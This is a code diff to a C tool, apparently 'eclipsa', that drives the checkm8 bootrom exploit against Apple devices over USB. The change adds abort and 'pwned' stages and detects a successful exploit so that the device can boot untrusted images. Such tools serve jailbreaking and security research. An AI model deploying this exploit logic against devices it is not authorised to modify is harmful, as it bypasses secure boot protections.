@@ -88,7 +88,8 @@ typedef enum {
 	STAGE_RESET,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_END
+	STAGE_ABORT,
+	STAGE_PWNED
 } stage_t;
 
 typedef struct {
@@ -160,13 +161,14 @@ cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, UInt16 val
 }
 
 static kern_return_t
-check_usb_device_serv(io_service_t serv) {
+check_usb_device_serv(io_service_t serv, bool *pwned) {
 	CFStringRef usb_serial_num = IORegistryEntryCreateCFProperty(serv, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, kNilOptions);
 	kern_return_t ret = KERN_FAILURE;
 
 	if(usb_serial_num != NULL) {
 		if(CFGetTypeID(usb_serial_num) == CFStringGetTypeID() && CFStringFind(usb_serial_num, CFSTR(" SRTG:[" SRTG "]"), 0).location != kCFNotFound) {
 			ret = KERN_SUCCESS;
+			*pwned = CFStringFind(usb_serial_num, CFSTR(" PWND:[eclipsa]"), 0).location != kCFNotFound;
 		}
 		CFRelease(usb_serial_num);
 	}
@@ -398,11 +400,12 @@ checkm8_stage_patch(const handle_t *handle) {
 static void
 attached_usb_handle(void *refcon, io_iterator_t iter) {
 	handle_t *handle = refcon;
+	bool pwned = false;
 	kern_return_t ret;
 	io_service_t serv;
 
 	while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
-		if(check_usb_device_serv(serv) == KERN_SUCCESS) {
+		if(check_usb_device_serv(serv, &pwned) == KERN_SUCCESS && !pwned) {
 			puts("Found the USB device.");
 			if(open_usb_device(serv, handle) == KERN_SUCCESS) {
 				if(handle->stage == STAGE_RESET) {
@@ -413,23 +416,28 @@ attached_usb_handle(void *refcon, io_iterator_t iter) {
 					ret = checkm8_stage_setup(handle);
 					printf("Stage: SETUP");
 					handle->stage = STAGE_PATCH;
-				} else {
+				} else if(handle->stage == STAGE_PATCH) {
 					ret = checkm8_stage_patch(handle);
 					printf("Stage: PATCH");
-					handle->stage = STAGE_END;
+					handle->stage = STAGE_ABORT;
+				} else {
+					ret = send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
+					printf("Stage: ABORT");
 				}
 				printf(", ret: 0x%" PRIX32 "\n", ret);
-				if((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) {
+				if(((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) && handle->stage != STAGE_ABORT) {
 					handle->stage = STAGE_RESET;
 				}
 				close_usb_device(handle);
-				if(handle->stage == STAGE_END) {
-					CFRunLoopStop(CFRunLoopGetCurrent());
-					break;
-				}
 			}
 		} else {
 			IOObjectRelease(serv);
+			if(pwned) {
+				handle->stage = STAGE_PWNED;
+				CFRunLoopStop(CFRunLoopGetCurrent());
+				puts("Now you can boot untrusted images.");
+				break;
+			}
 		}
 	}
 }
@@ -450,7 +458,7 @@ eclipsa(handle_t *handle) {
 				if(IOServiceAddMatchingNotification(notify_port, kIOFirstMatchNotification, matching_dict, attached_usb_handle, handle, &attach_iter) == KERN_SUCCESS) {
 					printf("Waiting for the USB device with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 ", SRTG: " SRTG "\n", handle->vid, handle->pid);
 					attached_usb_handle(handle, attach_iter);
-					if(handle->stage != STAGE_END) {
+					if(handle->stage != STAGE_PWNED) {
 						CFRunLoopRun();
 					}
 					IOObjectRelease(attach_iter);
